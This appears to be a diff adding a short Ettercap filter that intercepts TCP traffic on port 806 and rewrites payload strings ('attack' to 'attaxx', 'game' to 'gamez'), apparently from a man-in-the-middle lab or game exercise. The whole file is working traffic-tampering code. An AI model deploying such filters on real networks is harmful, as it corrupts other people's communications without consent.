@@ -1,0 +1,8 @@
+if (ip.src != '10.1.105.103' && ip.proto == TCP && tcp.dst == 806) {
+      replace("attack", "attaxx"); 
+      msg("attack hijacked!!\n");
+}
+if (ip.dst != '10.1.105.103' && ip.proto == TCP && tcp.src == 806) {
+   replace("game", "gamez");
+   msg("payload poisoned.\n");
+}
